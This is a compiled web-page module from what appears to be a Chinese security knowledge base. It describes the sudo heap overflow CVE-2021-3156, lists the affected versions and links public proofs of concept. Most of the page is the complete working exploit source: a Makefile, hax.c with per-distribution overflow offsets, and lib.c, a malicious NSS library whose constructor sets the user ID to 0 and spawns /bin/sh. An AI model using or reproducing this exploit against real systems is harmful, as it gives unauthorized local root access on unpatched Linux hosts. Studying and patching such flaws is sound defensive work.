import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as l,a as n,b as s,d as p,e as a}from"./app-58e4a7d6.js";const i={},u=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>2021年1月26日，Linux安全工具sudo被发现严重的基于堆缓冲区溢出漏洞。利用这一漏洞，攻击者无需知道用户密码，一样可以获得root权限，并且是在默认配置下。此漏洞已分配为CVE-2021-3156，危险等级评分为7分。</p><p>当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Sudo 1.8.2 - 1.8.31p2
Sudo 1.9.0 - 1.9.5p1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,6),r={href:"https://github.com/blasty/CVE-2021-3156",target:"_blank",rel:"noopener noreferrer"},k=a(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/1627098472921-85639abb-364c-4fed-929d-1739cb4128cb.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>当前可以验证的Linux环境为</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code> Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31  Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>这里使用腾讯云中的Ubuntu镜像进行复现</strong></p><figure><a href=""><img src="https://cb86160.webp.li/makabaka-r1-photo/1627098472850-197fab3c-2c70-48af-969c-e0f4108abe55.png" alt="" tabindex="0" loading="lazy"></a><figcaption></figcaption></figure><p>使用命令</p><figure><a href=""><img src="https://cb86160.webp.li/makabaka-r1-photo/1627098472851-ffe05143-de53-4d3d-8607-d825a9f9d76c.png" alt="" tabindex="0" loading="lazy"></a><figcaption></figcaption></figure><p>[<img src="https://cb86160.webp.li/makabaka-r1-photo/1627098473043-7c4d517c-465d-4261-a02d-549b7e8436c8.png" alt="" loading="lazy"></p><p>漏洞POC</p>`,9),d={href:"https://github.com/Rvn0xsy/CVE-2021-3156-plus",target:"_blank",rel:"noopener noreferrer"},v=a(`<p><strong>Makefile</strong></p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code>all<span class="token operator">:</span>
	rm <span class="token operator">-</span>rf libnss_X
	mkdir libnss_X
	gcc <span class="token operator">-</span>std<span class="token operator">=</span>c99 <span class="token operator">-</span>o sudo<span class="token operator">-</span>hax<span class="token operator">-</span>me<span class="token operator">-</span>a<span class="token operator">-</span>sandwich hax<span class="token punctuation">.</span>c
	gcc <span class="token operator">-</span>fPIC <span class="token operator">-</span>shared <span class="token operator">-</span>o <span class="token char">&#39;libnss_X/P0P_SH3LLZ_ .so.2&#39;</span> lib<span class="token punctuation">.</span>c
brute<span class="token operator">:</span> all
	gcc <span class="token operator">-</span>DBRUTE <span class="token operator">-</span>fPIC <span class="token operator">-</span>shared <span class="token operator">-</span>o <span class="token char">&#39;libnss_X/P0P_SH3LLZ_ .so.2&#39;</span> lib<span class="token punctuation">.</span>c
clean<span class="token operator">:</span>
	rm <span class="token operator">-</span>rf libnss_X sudo<span class="token operator">-</span>hax<span class="token operator">-</span>me<span class="token operator">-</span>a<span class="token operator">-</span>sandwich
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>hax.c</strong></p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">/**
 ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;
 ** ===========================================
 **
 ** Exploit for that sudo heap overflow thing everyone is talking about.
 ** This one aims for singleshot. Does not fuck with your system files.
 ** No warranties.
 **
 ** Shout outs to:
 **   Qualys      - for pumping out the awesome bugs
 **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
 **   dsc         - for letting me rack up his electricity bill
 **   my wife     - for all the quality time we had to skip
 **
 **  Enjoy!
 **
 **   -- blasty // 20210130
 **/</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h&gt;</span></span>

<span class="token comment">// 512 environment variables should be enough for everyone</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_ENVP</span> <span class="token expression"><span class="token number">512</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SUDOEDIT_PATH</span> <span class="token string">&quot;/usr/bin/sudoedit&quot;</span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>target_name<span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>sudoedit_path<span class="token punctuation">;</span>
	<span class="token class-name">uint32_t</span> smash_len_a<span class="token punctuation">;</span>
	<span class="token class-name">uint32_t</span> smash_len_b<span class="token punctuation">;</span>
	<span class="token class-name">uint32_t</span> null_stomp_len<span class="token punctuation">;</span>
	<span class="token class-name">uint32_t</span> lc_all_len<span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token class-name">target_t</span><span class="token punctuation">;</span>

<span class="token class-name">target_t</span> targets<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token punctuation">{</span>
        <span class="token comment">// Yes, same values as 20.04.1, but also confirmed.</span>
        <span class="token punctuation">.</span>target_name    <span class="token operator">=</span> <span class="token string">&quot;Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span>sudoedit_path  <span class="token operator">=</span> SUDOEDIT_PATH<span class="token punctuation">,</span>
        <span class="token punctuation">.</span>smash_len_a    <span class="token operator">=</span> <span class="token number">56</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span>smash_len_b    <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span>null_stomp_len <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">,</span> 
        <span class="token punctuation">.</span>lc_all_len     <span class="token operator">=</span> <span class="token number">212</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
        <span class="token punctuation">.</span>target_name    <span class="token operator">=</span> <span class="token string">&quot;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span>sudoedit_path  <span class="token operator">=</span> SUDOEDIT_PATH<span class="token punctuation">,</span>
        <span class="token punctuation">.</span>smash_len_a    <span class="token operator">=</span> <span class="token number">56</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span>smash_len_b    <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span>null_stomp_len <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">,</span> 
        <span class="token punctuation">.</span>lc_all_len     <span class="token operator">=</span> <span class="token number">212</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
        <span class="token punctuation">.</span>target_name    <span class="token operator">=</span> <span class="token string">&quot;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span>sudoedit_path  <span class="token operator">=</span> SUDOEDIT_PATH<span class="token punctuation">,</span>
        <span class="token punctuation">.</span>smash_len_a    <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span>smash_len_b    <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span>null_stomp_len <span class="token operator">=</span> <span class="token number">60</span><span class="token punctuation">,</span> 
        <span class="token punctuation">.</span>lc_all_len     <span class="token operator">=</span> <span class="token number">214</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">usage</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>prog<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span>
        <span class="token string">&quot;  usage: %s &lt;target&gt;\\n\\n&quot;</span>
        <span class="token string">&quot;  available targets:\\n&quot;</span>
        <span class="token string">&quot;  ------------------------------------------------------------\\n&quot;</span><span class="token punctuation">,</span>
        prog
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>targets<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">target_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;    %d) %s\\n&quot;</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> targets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>target_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span>
        <span class="token string">&quot;  ------------------------------------------------------------\\n&quot;</span>
        <span class="token string">&quot;\\n&quot;</span>
        <span class="token string">&quot;  manual mode:\\n&quot;</span>
        <span class="token string">&quot;    %s &lt;smash_len_a&gt; &lt;smash_len_b&gt; &lt;null_stomp_len&gt; &lt;lc_all_len&gt;\\n&quot;</span>
        <span class="token string">&quot;\\n&quot;</span><span class="token punctuation">,</span>
        prog
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;\\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\\n\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> argc <span class="token operator">!=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">usage</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token class-name">target_t</span> <span class="token operator">*</span>target <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> target_idx <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>target_idx <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> target_idx <span class="token operator">&gt;=</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>targets<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">target_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;invalid target index\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        target <span class="token operator">=</span> <span class="token operator">&amp;</span>targets<span class="token punctuation">[</span> target_idx <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>
        target <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">target_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        target<span class="token operator">-&gt;</span>target_name    <span class="token operator">=</span> <span class="token string">&quot;Manual&quot;</span><span class="token punctuation">;</span>
        target<span class="token operator">-&gt;</span>sudoedit_path  <span class="token operator">=</span> SUDOEDIT_PATH<span class="token punctuation">;</span>
        target<span class="token operator">-&gt;</span>smash_len_a    <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        target<span class="token operator">-&gt;</span>smash_len_b    <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        target<span class="token operator">-&gt;</span>null_stomp_len <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        target<span class="token operator">-&gt;</span>lc_all_len     <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">printf</span><span class="token punctuation">(</span>
        <span class="token string">&quot;using target: %s [&#39;%s&#39;] (%d, %d, %d, %d)\\n&quot;</span><span class="token punctuation">,</span> 
        target<span class="token operator">-&gt;</span>target_name<span class="token punctuation">,</span>
        target<span class="token operator">-&gt;</span>sudoedit_path<span class="token punctuation">,</span>
        target<span class="token operator">-&gt;</span>smash_len_a<span class="token punctuation">,</span>
        target<span class="token operator">-&gt;</span>smash_len_b<span class="token punctuation">,</span>
        target<span class="token operator">-&gt;</span>null_stomp_len<span class="token punctuation">,</span>
        target<span class="token operator">-&gt;</span>lc_all_len
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>smash_a <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>target<span class="token operator">-&gt;</span>smash_len_a <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>smash_b <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>target<span class="token operator">-&gt;</span>smash_len_b <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">memset</span><span class="token punctuation">(</span>smash_a<span class="token punctuation">,</span> <span class="token char">&#39;A&#39;</span><span class="token punctuation">,</span> target<span class="token operator">-&gt;</span>smash_len_a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>smash_b<span class="token punctuation">,</span> <span class="token char">&#39;B&#39;</span><span class="token punctuation">,</span> target<span class="token operator">-&gt;</span>smash_len_b<span class="token punctuation">)</span><span class="token punctuation">;</span>

    smash_a<span class="token punctuation">[</span>target<span class="token operator">-&gt;</span>smash_len_a<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">&#39;\\\\&#39;</span><span class="token punctuation">;</span>
    smash_b<span class="token punctuation">[</span>target<span class="token operator">-&gt;</span>smash_len_b<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">&#39;\\\\&#39;</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>s_argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span>
        <span class="token string">&quot;sudoedit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-s&quot;</span><span class="token punctuation">,</span> smash_a<span class="token punctuation">,</span> <span class="token string">&quot;\\\\&quot;</span><span class="token punctuation">,</span> smash_b<span class="token punctuation">,</span> <span class="token constant">NULL</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>s_envp<span class="token punctuation">[</span>MAX_ENVP<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> envp_pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> target<span class="token operator">-&gt;</span>null_stomp_len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        s_envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;\\\\&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    s_envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;X/P0P_SH3LLZ_&quot;</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>lc_all <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>target<span class="token operator">-&gt;</span>lc_all_len <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>lc_all<span class="token punctuation">,</span> <span class="token string">&quot;LC_ALL=C.UTF-8@&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>lc_all<span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token char">&#39;C&#39;</span><span class="token punctuation">,</span> target<span class="token operator">-&gt;</span>lc_all_len<span class="token punctuation">)</span><span class="token punctuation">;</span>

    s_envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> lc_all<span class="token punctuation">;</span>
    s_envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;** pray for your rootshell.. **\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">execve</span><span class="token punctuation">(</span>target<span class="token operator">-&gt;</span>sudoedit_path<span class="token punctuation">,</span> s_argv<span class="token punctuation">,</span> s_envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>lib.c</strong></p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
 
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;[+] bl1ng bl1ng! We got it!\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">BRUTE</span></span>
	<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">&quot;sh&quot;</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">&quot;PATH=/bin:/usr/bin:/sbin&quot;</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">,</span> a_argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6);function m(b,g){const t=o("ExternalLinkIcon");return c(),l("div",null,[u,n("p",null,[s("目前POC已经在Github公开："),n("a",r,[s("Linux sudo权限提升漏洞 CVE-2021-3156"),p(t)])]),k,n("p",null,[s("一个无交互式shell使用的脚本 "),n("a",d,[s("https://github.com/Rvn0xsy/CVE-2021-3156-plus"),p(t)])]),v])}const f=e(i,[["render",m],["__file","Linux sudo 权限提升漏洞 CVE-2021-3156.html.vue"]]);export{f as default};
